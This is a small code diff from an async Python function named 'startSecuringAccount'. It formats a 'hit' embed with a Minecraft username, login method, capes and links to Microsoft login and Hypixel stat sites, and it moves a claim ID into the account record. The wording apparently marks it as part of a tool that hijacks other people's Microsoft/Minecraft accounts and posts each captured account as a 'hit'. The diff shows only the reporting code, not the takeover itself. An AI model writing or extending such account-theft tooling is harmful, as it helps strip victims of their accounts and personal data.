@@ -94,7 +94,6 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
         description = f"[Login](https://login.live.com/) | [Donut](https://www.donutstats.net/player-finder) | [SkyCrypt](https://sky.shiiyu.moe/stats/{name}) | [Plancke](https://plancke.io/hypixel/player/stats/{name}) | [Is Online](https://hypixel.paniek.de/player/{name}/status)",
         color = 0x279CF5
     )
-    hit_embed.add_field(name="Claim ID", value=f"`{claim_id}`", inline=False)
     hit_embed.add_field(name="MC Username", value=f"```{account['minecraft']['name']}```", inline=False)
     hit_embed.add_field(name="MC Method", value=f"```{account['minecraft']['method']}```", inline=True)
     hit_embed.add_field(name="MC Capes", value=f"```{account['minecraft']['capes']}```", inline=True)
@@ -125,6 +124,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
 
     accountData = {
         "hit_embed": hit_embed,
+        "claim_id": claim_id,
         "minecraft": account["minecraft"],
         "details": {
             "stats_embed": stats_embed,
